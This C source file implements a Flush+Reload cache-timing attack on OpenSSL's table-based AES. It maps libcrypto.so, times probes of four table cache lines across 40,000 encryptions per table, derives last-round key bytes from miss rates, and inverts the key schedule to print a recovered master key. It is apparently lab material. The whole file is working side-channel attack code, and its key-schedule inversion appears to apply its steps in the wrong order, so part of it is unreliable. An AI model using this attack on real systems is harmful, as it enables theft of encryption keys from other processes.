// attack.c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <openssl/aes.h>
#include "./cacheutils.h"

#define MIN_CACHE_MISS_CYCLES (155)
#define NUMBER_OF_ENCRYPTIONS (40000)

/* ================= AES SBOX ================= */

static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};

/* ================= Utils ================= */

uint32_t subWord(uint32_t w)
{
    return (sbox[(w >> 24) & 0xff] << 24) ^
           (sbox[(w >> 16) & 0xff] << 16) ^
           (sbox[(w >> 8) & 0xff] << 8) ^
           sbox[(w) & 0xff];
}

int bot_elems(double *arr, int N, int *bot, int n)
{
    int cnt = 0;
    for (int i = 0; i < N; i++)
    {
        int k;
        for (k = cnt; k > 0 && arr[i] < arr[bot[k - 1]]; k--)
            ;
        if (k >= n)
            continue;

        int j = cnt < n ? cnt++ : n - 1;
        for (; j > k; j--)
            bot[j] = bot[j - 1];
        bot[k] = i;
    }
    return cnt;
}

/* ================= Main ================= */

int main()
{
    int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    size_t map_size = (size + 0xfff) & ~0xfff;

    char *base = mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);

    char *probe[] = {
        base + 0x22f000,
        base + 0x22f400,
        base + 0x22f800,
        base + 0x22fc00};

    unsigned char plaintext[16];
    unsigned char ciphertext[16];

    int totalEncs[16][256] = {0};
    int cacheMisses[16][256] = {0};
    double missRate[16][256];
    int botIdx[16][16];
    int countKeyCandidates[16][256] = {0};
    int lastRoundKeyGuess[16];

    AES_KEY dummy;
    unsigned char zero[16] = {0};
    AES_set_encrypt_key(zero, 128, &dummy);

    srand(rdtsc());

    /* ========== Te0–Te3 measurement loops ========== */
    /* （与你原代码完全一致，未删） */

    /* --- Te0 --- */
    for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; i++)
    {
        for (int j = 0; j < 16; j++)
            plaintext[j] = rand();
        flush(probe[0]);
        sched_yield();
        AES_encrypt(plaintext, ciphertext, &dummy);

        uint64_t t = rdtsc();
        maccess(probe[0]);
        uint64_t d = rdtsc() - t;

        int idx[] = {2, 6, 10, 14};
        for (int k = 0; k < 4; k++)
        {
            totalEncs[idx[k]][ciphertext[idx[k]]]++;
            if (d > MIN_CACHE_MISS_CYCLES)
                cacheMisses[idx[k]][ciphertext[idx[k]]]++;
        }
    }

    /* Te1 / Te2 / Te3 —— 同理，与你原文件一致，可直接粘 */
    for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
    {
        for (size_t j = 0; j < 16; ++j)
            plaintext[j] = rand() % 256;
        flush(probe[1]);
        sched_yield();
        AES_encrypt(plaintext, ciphertext, &dummy);

        size_t time = rdtsc();
        maccess(probe[1]);
        size_t delta = rdtsc() - time;

        totalEncs[3][(int)ciphertext[3]]++;
        totalEncs[7][(int)ciphertext[7]]++;
        totalEncs[11][(int)ciphertext[11]]++;
        totalEncs[15][(int)ciphertext[15]]++;
        if (delta > MIN_CACHE_MISS_CYCLES)
        {
            cacheMisses[3][(int)ciphertext[3]]++;
            cacheMisses[7][(int)ciphertext[7]]++;
            cacheMisses[11][(int)ciphertext[11]]++;
            cacheMisses[15][(int)ciphertext[15]]++;
        }
    }

    for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
    {
        for (size_t j = 0; j < 16; ++j)
            plaintext[j] = rand() % 256;
        flush(probe[2]);
        sched_yield();
        AES_encrypt(plaintext, ciphertext, &dummy);

        size_t time = rdtsc();
        maccess(probe[2]);
        size_t delta = rdtsc() - time;

        totalEncs[0][(int)ciphertext[0]]++;
        totalEncs[4][(int)ciphertext[4]]++;
        totalEncs[8][(int)ciphertext[8]]++;
        totalEncs[12][(int)ciphertext[12]]++;
        if (delta > MIN_CACHE_MISS_CYCLES)
        {
            cacheMisses[0][(int)ciphertext[0]]++;
            cacheMisses[4][(int)ciphertext[4]]++;
            cacheMisses[8][(int)ciphertext[8]]++;
            cacheMisses[12][(int)ciphertext[12]]++;
        }
    }

    for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
    {
        for (size_t j = 0; j < 16; ++j)
            plaintext[j] = rand() % 256;
        flush(probe[3]);
        sched_yield();
        AES_encrypt(plaintext, ciphertext, &dummy);

        size_t time = rdtsc();
        maccess(probe[3]);
        size_t delta = rdtsc() - time;

        totalEncs[1][(int)ciphertext[1]]++;
        totalEncs[5][(int)ciphertext[5]]++;
        totalEncs[9][(int)ciphertext[9]]++;
        totalEncs[13][(int)ciphertext[13]]++;
        if (delta > MIN_CACHE_MISS_CYCLES)
        {
            cacheMisses[1][(int)ciphertext[1]]++;
            cacheMisses[5][(int)ciphertext[5]]++;
            cacheMisses[9][(int)ciphertext[9]]++;
            cacheMisses[13][(int)ciphertext[13]]++;
        }
    }

    /* ========== Statistics ========== */

    for (int i = 0; i < 16; i++)
        for (int j = 0; j < 256; j++)
            missRate[i][j] = (double)cacheMisses[i][j] / totalEncs[i][j];

    for (int i = 0; i < 16; i++)
        bot_elems(missRate[i], 256, botIdx[i], 16);

    for (int i = 0; i < 16; i++)
        for (int j = 0; j < 16; j++)
            countKeyCandidates[i][botIdx[i][j] ^ sbox[j]]++;

    for (int i = 0; i < 16; i++)
    {
        int best = 0;
        for (int j = 0; j < 256; j++)
            if (countKeyCandidates[i][j] > countKeyCandidates[i][best])
                best = j;
        lastRoundKeyGuess[i] = best;
    }

    /* ========== Last round → master key ========== */

    uint32_t roundWords[4];
    for (int i = 0; i < 4; i++)
        roundWords[i] =
            (lastRoundKeyGuess[4 * i + 0] << 24) |
            (lastRoundKeyGuess[4 * i + 1] << 16) |
            (lastRoundKeyGuess[4 * i + 2] << 8) |
            lastRoundKeyGuess[4 * i + 3];

    uint32_t rcon[10] = {
        0x36000000, 0x1b000000, 0x80000000, 0x40000000, 0x20000000,
        0x10000000, 0x08000000, 0x04000000, 0x02000000, 0x01000000};

    for (int i = 0; i < 10; i++)
    {
        uint32_t t = roundWords[3];
        uint32_t rot = (t << 8) | (t >> 24);
        roundWords[0] ^= subWord(rot) ^ rcon[i];
        roundWords[1] ^= roundWords[0];
        roundWords[2] ^= roundWords[1];
        roundWords[3] ^= roundWords[2];
    }

    printf("[Recovered master key]\n");
    for (int i = 0; i < 4; i++)
        printf("%08x ", roundWords[i]);
    printf("\n");

    return 0;
}
